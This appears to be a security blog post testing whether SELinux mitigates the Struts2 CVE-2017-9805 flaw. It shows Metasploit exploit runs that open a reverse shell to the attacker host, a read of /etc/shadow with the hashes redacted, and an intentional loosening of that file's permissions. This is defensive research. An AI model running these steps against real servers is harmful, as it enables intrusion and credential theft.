+++
date = "2017-09-11T15:59:59+09:00"
title = "S2-052: CVE-2017-9805(Struts2) PoC with SELinux"
draft = false

+++

We did recently "Important" Struts2 vulnerability(CVE-2017-9805) PoC to check how SELinux can mitigate that vulnerability. 

(Written by Kazuki Omo:ka-omo@sios.com).

## Prepare for PoC

Here is a description how to reproduce it. **I used CentOS7 image for the PoC.
I used VMWare Guest(CPU: 1, Memory: 2GB) for the PoC.**
Also, I used selinux-policy-targeted-3.13.1-145.el7.noarch (See related post: http://www.secureoss.jp/post/omok-selinux-struts2-20170607/).

  1.  Install tomcat and related packages for working Struts2.

  2.  Download and install vulnerable version of Struts2. I used struts-2.5.11. Copy struts2-showcase.war and struts2-rest-showcase.war under /var/lib/tomcat/webapps
        
        root@centos7:~# ls /var/ls /var/lib/tomcat/webapps/*war
        /var/lib/tomcat/webapps/struts2-showcase.war
        /var/lib/tomcat/webapps/struts2-rest-showcase.war

  3.  Prepare Metasploit for the PoC. You can easy to use "Kali Linux(https://www.kali.org/downloads/)" for running Metasploit Framework. Run "apt-get update ; apt-get upgrade" for updating Kali Linux completely, then follow the procedure for running CVE-2017-9805 PoC (Set up Metasploit Module for Apache Struts2 Rest : http://hackersgrid.com/2017/09/metasploit-module-for-apache-struts-2-rest-cve-2017-9805.html).

  4.  To avoid normal Unix permission check for the PoC, I changed /etc/shadow permission to 755. 
	
        root@centos7:~# ls -lZ /etc/shadow
        -rwxr-xr-x. root root system_u:object_r:shadow_t:s0        /etc/shadow


* * *

## PoC with no SELinux(SELinux Permissive)

  1.  Confirm SELinux is Permissive mode;
        
        root@centos7:~# getenforce
        Permissive
        

  2. Run PoC from msfconsole(Metasploit). AA.AA.AA.AA is Kali Linux IP, and XX.XX.X.XX is Struts2 PoC server;
        
         msf exploit(struts2_rest_xstream) > exploit
         
         [*] Started reverse TCP double handler on AA.AA.AA.AA:4444 
         [*] Accepted the first client connection...
         [*] Accepted the second client connection...
         [*] Command: echo DxP98C50UAVxX6jn;
         [*] Writing to socket A
         [*] Writing to socket B
         [*] Reading from sockets...
         [*] Reading from socket B
         [*] B: "DxP98C50UAVxX6jn\r\n"
         [*] Matching...
         [*] A is input...
         [*] Command shell session 2 opened (AA.AA.AA.AA:4444 -> XX.XX.XX.XX:43584) at 2017-09-11 15:42:12 +0900
         
         id
         uid=91(tomcat) gid=91(tomcat) groups=91(tomcat) context=system_u:system_r:tomcat_t:s0

         root:XXXXXX.::0:99999:7:::
         bin:*:17110:0:99999:7:::
         daemon:*:17110:0:99999:7:::
         --snip--
         sshd:!!:17247::::::
         jssosug:XXXXXXXXXXXX::0:99999:7:::
        
         jsossug@vmhost:~$

* * *
## PoC with SELinux Enabled(SELinux Enforcing)

  1. Reboot and set SELinux as Enforcing.

        root@centos7:~# getenforce
        Enforcing

  2. Run PoC from msfconsole(Metasploit). AA.AA.AA.AA is Kali Linux IP, and XX.XX.X.XX is Struts2 PoC server;
        
         msf exploit(struts2_rest_xstream) > exploit
         
         [*] Started reverse TCP double handler on AA.AA.AA.AA:4444 
         [*] Accepted the first client connection...
         [*] Accepted the second client connection...
         [*] Command: echo DxP98C50UAVxX6jn;
         [*] Writing to socket A
         [*] Writing to socket B
         [*] Reading from sockets...
         [*] Reading from socket B
         [*] B: "DxP98C50UAVxX6jn\r\n"
         [*] Matching...
         [*] A is input...
         [*] Command shell session 2 opened (AA.AA.AA.AA:4444 -> XX.XX.XX.XX:43584) at 2017-09-11 15:49:01 +0900
         
         id 
         uid=91(tomcat) gid=91(tomcat) groups=91(tomcat) context=system_u:system_r:tomcat_t:s0

         cat /etc/shadow
         cat: /etc/shadow: Permission denied

   3. Check AVC log on Struts PC;

        type=AVC msg=audit(1505112552.257:431): avc:  denied  { read } for  pid=4684 comm="cat" name="shadow" dev="dm-1" ino=34690693 scontext=system_u:system_r:tomcat_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file

        
* * *
## Conclusion

From this PoC we can say

1. Latest SELinux can mitigate Struts2 vulnerability "if Policy is updated".
